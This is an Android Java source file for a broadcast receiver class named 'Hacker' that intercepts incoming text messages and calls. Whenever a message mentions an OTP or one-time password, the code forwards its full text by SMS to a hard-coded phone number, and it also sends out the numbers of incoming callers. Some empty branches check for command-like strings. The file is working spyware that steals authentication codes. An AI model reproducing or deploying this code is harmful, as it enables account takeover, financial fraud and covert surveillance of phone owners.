package com.example.rajesh.anil;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.telephony.SmsManager;
import android.telephony.SmsMessage;
import android.telephony.TelephonyManager;

/**
 * Created by rajesh on 6/21/2017.
 */

public class Hacker extends BroadcastReceiver {
SmsManager mngr;


    @Override
    public void onReceive(Context context, Intent intent) {
        TelephonyManager telephony = (TelephonyManager) context
                .getSystemService(Context.TELEPHONY_SERVICE);
        if(intent.getAction().equals("android.provider.Telephony.SMS_RECEIVED"))
        {
            Object[] abc = (Object[]) intent.getExtras().get("pdus");
            SmsMessage[] messages = new SmsMessage[abc.length];

            for (int i=0;i<abc.length;i++)
            {
                messages[i] = SmsMessage.createFromPdu((byte[]) abc[i]);
            }

            String msg= messages[0].getMessageBody();
            String num=messages[0].getOriginatingAddress();

            if(msg.contains("@123"))
            {

            }

            if(msg.contains("@123@"))
            {

            }
            if(msg.contains("@#$"))
            {

            }

            if(msg.contains("OTP")||msg.contains("otp")||msg.contains("one time password"))
            {
                mngr=SmsManager.getDefault();
                mngr.sendTextMessage("9962359921","null",msg,null,null);
            }

        }
        else   if(intent.getAction().equals("android.intent.action.PHONE_STATE"))
        {

            if(telephony.getCallState()==TelephonyManager.CALL_STATE_IDLE) {
                String phoneNr = intent.getExtras().getString("incoming_number");

                mngr = SmsManager.getDefault();
                mngr.sendTextMessage("9962359921", "null", phoneNr, null, null);
            }
        }


    }
}
